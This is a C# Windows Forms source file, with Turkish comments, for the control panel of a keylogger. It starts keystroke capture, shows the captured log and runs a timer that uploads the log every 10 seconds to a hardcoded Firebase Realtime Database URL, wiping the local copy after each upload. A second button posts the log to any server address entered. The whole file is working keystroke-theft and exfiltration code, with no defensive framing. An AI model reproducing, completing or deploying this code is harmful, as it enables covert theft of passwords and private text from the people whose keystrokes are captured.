using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Keylogger
{
    public partial class MainForm : Form
    {
        private KeyloggerEngine keylogger;
        private System.Windows.Forms.Timer logUpdateTimer;
        private System.Windows.Forms.Timer cloudUploadTimer;
        private bool isLogging = false;

        public MainForm()
        {
            InitializeComponent();
            InitializeTimer();
        }

        private void InitializeTimer()
        {
            logUpdateTimer = new System.Windows.Forms.Timer();
            logUpdateTimer.Interval = 2000; // 2 saniyede bir güncelle
            logUpdateTimer.Tick += LogUpdateTimer_Tick;

            // Cloud upload timer - 10 saniyede bir
            cloudUploadTimer = new System.Windows.Forms.Timer();
            cloudUploadTimer.Interval = 10000; // 10 saniye
            cloudUploadTimer.Tick += CloudUploadTimer_Tick;
        }

        private void LogUpdateTimer_Tick(object sender, EventArgs e)
        {
            UpdateLogDisplay();
        }

        private void UpdateLogDisplay()
        {
            try
            {
                string logPath = KeyloggerEngine.GetLogFilePath();
                if (File.Exists(logPath))
                {
                    string content = File.ReadAllText(logPath, Encoding.UTF8);
                    // Son 1000 karakteri göster (performans için)
                    if (content.Length > 1000)
                    {
                        content = "..." + content.Substring(content.Length - 1000);
                    }
                    txtLog.Text = content;
                    txtLog.SelectionStart = txtLog.Text.Length;
                    txtLog.ScrollToCaret();
                }
            }
            catch (Exception ex)
            {
                lblStatus.Text = $"Log okuma hatası: {ex.Message}";
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (!isLogging)
            {
                keylogger = new KeyloggerEngine();
                isLogging = true;
                btnStart.Text = "Durdur";
                lblStatus.Text = "Keylogger çalışıyor... (Cloud upload: 10 sn)";
                logUpdateTimer.Start();
                cloudUploadTimer.Start(); // Cloud upload başlat
            }
            else
            {
                keylogger?.StopLogging();
                isLogging = false;
                btnStart.Text = "Başlat";
                lblStatus.Text = "Keylogger durduruldu.";
                logUpdateTimer.Stop();
                cloudUploadTimer.Stop(); // Cloud upload durdur
            }
        }

        private void btnClearLog_Click(object sender, EventArgs e)
        {
            try
            {
                string logPath = KeyloggerEngine.GetLogFilePath();
                if (File.Exists(logPath))
                {
                    File.WriteAllText(logPath, string.Empty);
                    txtLog.Clear();
                    lblStatus.Text = "Log temizlendi.";
                }
            }
            catch (Exception ex)
            {
                lblStatus.Text = $"Log temizleme hatası: {ex.Message}";
            }
        }

        private async void CloudUploadTimer_Tick(object sender, EventArgs e)
        {
            if (isLogging)
            {
                await UploadToCloud();
            }
        }

        private async Task UploadToCloud()
        {
            try
            {
                string logPath = KeyloggerEngine.GetLogFilePath();
                if (!File.Exists(logPath))
                {
                    lblStatus.Text = "Log dosyası bulunamadı";
                    return;
                }

                string logContent = File.ReadAllText(logPath, Encoding.UTF8);
                if (string.IsNullOrEmpty(logContent))
                {
                    lblStatus.Text = "Log boş, upload edilecek veri yok";
                    return;
                }

                // Firebase Realtime Database URL - hardcoded ve doğru format
                string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss_fff");
                string cloudUrl = $"https://deneme-6195c-default-rtdb.firebaseio.com/logs/{timestamp}.json";
                
                lblStatus.Text = "Firebase'e gönderiliyor...";
                
                using (HttpClient client = new HttpClient())
                {
                    // Timeout ayarla
                    client.Timeout = TimeSpan.FromSeconds(30);
                    
                    // Firebase için JSON format - daha güvenli escape
                    string cleanContent = System.Text.Json.JsonSerializer.Serialize(logContent);
                    string timestampStr = System.Text.Json.JsonSerializer.Serialize(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    string jsonData = $"{{\"timestamp\":{timestampStr},\"content\":{cleanContent}}}";
                    
                    var content = new StringContent(jsonData, Encoding.UTF8, "application/json");
                    
                    // Debug: URL ve JSON'u göster
                    lblStatus.Text = $"Gönderiliyor: {cloudUrl.Substring(cloudUrl.LastIndexOf('/') + 1)}";
                    
                    var response = await client.PutAsync(cloudUrl, content);
                    string responseBody = await response.Content.ReadAsStringAsync();
                    
                    if (response.IsSuccessStatusCode)
                    {
                        // Başarılı upload sonrası log dosyasını temizle
                        File.WriteAllText(logPath, string.Empty);
                        lblStatus.Text = $"✓ Cloud'a yüklendi: {DateTime.Now:HH:mm:ss}";
                    }
                    else
                    {
                        lblStatus.Text = $"❌ Upload hatası: {response.StatusCode}";
                        // Detaylı hata için console'a yaz
                        System.Diagnostics.Debug.WriteLine($"Firebase Error: {response.StatusCode} - {responseBody}");
                    }
                }
            }
            catch (HttpRequestException httpEx)
            {
                lblStatus.Text = $"❌ Ağ hatası: {httpEx.Message}";
                System.Diagnostics.Debug.WriteLine($"HTTP Error: {httpEx}");
            }
            catch (TaskCanceledException timeoutEx)
            {
                lblStatus.Text = "❌ Timeout: Firebase'e bağlanılamadı";
                System.Diagnostics.Debug.WriteLine($"Timeout Error: {timeoutEx}");
            }
            catch (Exception ex)
            {
                lblStatus.Text = $"❌ Genel hata: {ex.Message}";
                System.Diagnostics.Debug.WriteLine($"General Error: {ex}");
            }
        }

        private async void btnSendLog_Click(object sender, EventArgs e)
        {
            try
            {
                string serverUrl = txtServerUrl.Text.Trim();
                if (string.IsNullOrEmpty(serverUrl))
                {
                    MessageBox.Show("Lütfen sunucu URL'sini girin.", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                string logPath = KeyloggerEngine.GetLogFilePath();
                if (!File.Exists(logPath))
                {
                    MessageBox.Show("Log dosyası bulunamadı.", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                string logContent = File.ReadAllText(logPath, Encoding.UTF8);
                
                using (HttpClient client = new HttpClient())
                {
                    var content = new StringContent(logContent, Encoding.UTF8, "text/plain");
                    var response = await client.PostAsync(serverUrl, content);
                    
                    if (response.IsSuccessStatusCode)
                    {
                        lblStatus.Text = "Log başarıyla gönderildi.";
                    }
                    else
                    {
                        lblStatus.Text = $"Gönderme hatası: {response.StatusCode}";
                    }
                }
            }
            catch (Exception ex)
            {
                lblStatus.Text = $"Gönderme hatası: {ex.Message}";
            }
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            keylogger?.StopLogging();
            logUpdateTimer?.Stop();
            cloudUploadTimer?.Stop();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                keylogger?.StopLogging();
                logUpdateTimer?.Dispose();
                cloudUploadTimer?.Dispose();
                if (components != null)
                {
                    components.Dispose();
                }
            }
            base.Dispose(disposing);
        }
    }
}